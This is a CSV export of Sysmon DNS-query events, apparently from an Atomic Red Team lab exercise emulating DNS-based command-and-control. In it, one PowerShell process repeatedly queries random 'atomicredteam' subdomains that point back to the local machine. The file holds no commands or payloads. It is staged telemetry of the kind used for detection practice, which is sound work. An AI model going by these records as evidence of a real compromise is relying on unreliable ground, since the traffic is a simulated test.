"2025-12-26 11:27:20.668 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174485,"Query: atomicredteam-818432.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:20.132","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:20.668 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174486,"Query: atomicredteam-516930.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:20.191","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:20.686 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174487,"Query: atomicredteam-176883.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:20.377","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:20.686 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174488,"Query: atomicredteam-886692.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:20.434","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:20.691 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174489,"Query: atomicredteam-380622.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:20.492","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:21.631 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174490,"Query: atomicredteam-807658.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:20.554","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:21.631 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174491,"Query: atomicredteam-276368.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:20.778","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:21.631 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174492,"Query: atomicredteam-845688.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:20.826","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:21.631 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174493,"Query: atomicredteam-442991.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:21.000","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:21.632 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174494,"Query: atomicredteam-575023.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:21.317","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:21.632 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174495,"Query: atomicredteam-170565.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:21.375","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:21.632 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174496,"Query: atomicredteam-430276.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:21.423","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:21.632 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174497,"Query: atomicredteam-782282.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:21.462","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:21.632 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174498,"Query: atomicredteam-653202.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:21.502","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:22.639 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174499,"Query: atomicredteam-255037.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:21.542","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:22.639 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174500,"Query: atomicredteam-385133.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:21.580","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:22.643 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174501,"Query: atomicredteam-964201.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:21.630","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:22.643 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174502,"Query: atomicredteam-200995.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:21.686","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:22.643 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174503,"Query: atomicredteam-659620.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:21.733","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:22.643 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174504,"Query: atomicredteam-985356.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:21.903","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:22.644 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174505,"Query: atomicredteam-359077.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:21.944","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:22.644 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174506,"Query: atomicredteam-612095.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:21.986","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:22.644 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174507,"Query: atomicredteam-4032.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:22.024","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:22.644 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174508,"Query: atomicredteam-86779.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:22.061","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:22.644 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174509,"Query: atomicredteam-724763.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:22.099","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:22.644 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174510,"Query: atomicredteam-464841.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:22.139","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:22.644 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174511,"Query: atomicredteam-8612.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:22.178","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:22.644 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174512,"Query: atomicredteam-3818.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:22.219","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:22.644 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174513,"Query: atomicredteam-744101.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:22.256","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:22.644 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174514,"Query: atomicredteam-525129.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:22.435","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:22.644 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174515,"Query: atomicredteam-347701.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:22.473","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:23.960 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174516,"Query: atomicredteam-903663.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:22.512","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:23.961 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174517,"Query: atomicredteam-412650.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:22.831","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:23.961 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174518,"Query: atomicredteam-381466.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:22.871","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:23.961 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174519,"Query: atomicredteam-98058.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:22.914","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:23.961 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174520,"Query: atomicredteam-212898.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:22.952","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:23.962 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174521,"Query: atomicredteam-950348.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:22.998","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:23.962 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174522,"Query: atomicredteam-977599.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:23.039","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:23.962 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174523,"Query: atomicredteam-600264.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:23.079","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:23.963 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174524,"Query: atomicredteam-949941.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:23.127","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:23.963 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174525,"Query: atomicredteam-560120.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:23.165","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:23.963 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174526,"Query: atomicredteam-957123.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:23.205","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:23.963 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174527,"Query: atomicredteam-76078.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:23.265","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:24.672 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174528,"Query: atomicredteam-959750.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:23.364","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:24.672 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174529,"Query: atomicredteam-829527.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:23.964","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:24.672 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174530,"Query: atomicredteam-46500.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:24.154","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:24.672 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174531,"Query: atomicredteam-722932.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:24.216","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:24.672 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174532,"Query: atomicredteam-285328.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:24.263","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
